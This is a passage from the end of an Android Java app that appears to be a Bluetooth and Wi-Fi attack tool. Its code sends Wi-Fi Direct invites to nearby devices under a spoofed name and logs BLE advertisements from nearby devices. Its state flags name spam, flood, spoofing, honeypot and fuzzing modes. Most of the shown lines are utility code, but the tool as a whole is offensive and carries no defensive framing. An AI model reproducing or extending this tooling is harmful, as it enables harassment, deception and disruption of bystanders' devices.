                f.setInt(config, 0);
            } catch (Exception e) {}
            
            try {
                wifiP2pManager.connect(wifiChannel, config, new WifiP2pManager.ActionListener() {
                    public void onSuccess() {
                        log("  📩 Invite sent → " + peerName + " (showing as: \"" + spoofName + "\")");
                    }
                    public void onFailure(int code) {
                        log("  ✕ Invite failed → " + peerName + " (code: " + code + ")");
                    }
                });
            } catch (Exception e) {
                log("  ✕ WiFi connect error: " + e.getMessage());
            }
            
            // No sleep — non-blocking
        }
    }

    // ═══════════════════════════════════════════
    //  UTILITY
    // ═══════════════════════════════════════════

    private boolean btReady() {
        if (btAdapter == null) { log("✕ No BT"); return false; }
        if (!btAdapter.isEnabled()) { log("✕ BT off"); startActivityForResult(new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE), REQUEST_ENABLE_BT); return false; }
        return true;
    }

    private boolean hasDevice(BluetoothDevice d) {
        synchronized (discoveredDevices) {
            for (BluetoothDevice x : discoveredDevices) {
                if (x.getAddress().equals(d.getAddress())) return true;
            }
            return false;
        }
    }

    private void addDevice(BluetoothDevice d, short rssi) {
        synchronized (discoveredDevices) { discoveredDevices.add(d); }
        String n = getName(d); deviceNameMap.put(d.getAddress(), n);
        if (deviceListAdapter != null) {
            deviceListAdapter.add("[" + d.getAddress() + "] " + n + " (" + rssi + "dBm)");
        }
        if (deviceCountText != null) {
            deviceCountText.setText("DEVICES: " + discoveredDevices.size());
        }
        log("  📱 " + n);
    }

    private String getName(BluetoothDevice d) {
        return ObBluetooth.deviceName(d);
    }

    private void acquireWakeLock() {
        if (wakeLock != null && !wakeLock.isHeld()) wakeLock.acquire(10 * 60 * 1000L);
    }

    private void releaseWakeLock() {
        if (!isDiscSpam && !isPairSpam && !isConnSpam && !isBleSpam && !isWifiSpam
            && !isBleTargetActive && !isCycling && !isProbeFlood && !isBtNameTurbo
            && !isMdnsSpoof && !isSsdpSpoof && !isHoneypot && !isFuzzActive)
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    private void updateStatus(String s) {
        mainHandler.post(new Runnable() { public void run() { statusText.setText("⚡ " + s); }});
    }

    private void log(final String msg) {
        mainHandler.post(new Runnable() { public void run() {
            if (logText != null) { logText.append(msg + "\n");
                int scroll = logText.getLayout() != null ? logText.getLayout().getLineTop(logText.getLineCount()) - logText.getHeight() : 0;
                if (scroll > 0) logText.scrollTo(0, scroll);
            }
        }});
    }

    private void setBtnOn(Button b, String t) { ObUi.setButtonOn(b, t); }
    private void resetBtn(Button b, String t) { ObUi.resetButton(b, t); }

    private byte[] hexToBytes(String s) {
        if (s == null || s.length() == 0) return new byte[0];
        if (!s.matches("[0-9A-Fa-f]*")) { log("✕ Invalid hex input"); return new byte[0]; }
        if (s.length() % 2 != 0) s = "0" + s;
        int l = s.length(); byte[] d = new byte[l/2];
        try {
            for (int i = 0; i < l; i += 2) d[i/2] = (byte)((Character.digit(s.charAt(i),16)<<4) + Character.digit(s.charAt(i+1),16));
        } catch (Exception e) { return new byte[0]; }
        return d;
    }

    // ═══════════════════════════════════════════
    //  BLE SCAN CALLBACK
    // ═══════════════════════════════════════════

    private class BleScanCb extends ScanCallback {
        public void onScanResult(int type, ScanResult r) {
            BluetoothDevice d = r.getDevice();
            if (d != null) { final BluetoothDevice fd = d; final short fr = (short)r.getRssi(); mainHandler.post(new Runnable() { public void run() { if (!hasDevice(fd)) addDevice(fd, fr); }}); }
            // Log full BLE advertisement for analysis
            ScanRecord rec = r.getScanRecord();
            if (rec != null) {
                String n = d != null ? (d.getName() != null ? d.getName() : d.getAddress()) : "?";
                StringBuilder sb = new StringBuilder();
                sb.append("  📻 ").append(n).append(" [").append(r.getRssi()).append("dBm]");
                if (rec.getManufacturerSpecificData() != null) {
                    android.util.SparseArray<byte[]> mfrData = rec.getManufacturerSpecificData();
                    for (int j = 0; j < mfrData.size(); j++) {
                        int id = mfrData.keyAt(j);
                        byte[] md = mfrData.get(id);
                        if (md == null) continue;
                        sb.append(" mfr=0x").append(Integer.toHexString(id));
                        sb.append(" data=");
                        for (byte b : md) sb.append(String.format("%02X", b & 0xFF));
                    }
                }
                if (rec.getServiceUuids() != null) {
                    for (ParcelUuid u : rec.getServiceUuids()) {
                        sb.append(" svc=").append(u.toString().substring(0,8));
                    }
                }
                if (rec.getServiceData() != null) {
                    for (ParcelUuid u : rec.getServiceData().keySet()) {
                        sb.append(" svcdata=").append(u.toString().substring(0,8));
                    }
                }
                log(sb.toString());
            }
        }
    }

    // ═══════════════════════════════════════════
    //  ACTIVITY RESULT
    // ═══════════════════════════════════════════

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQUEST_ENABLE_BT && res == RESULT_OK) { log("✓ BT enabled"); updateStatus("READY"); }
    }
}
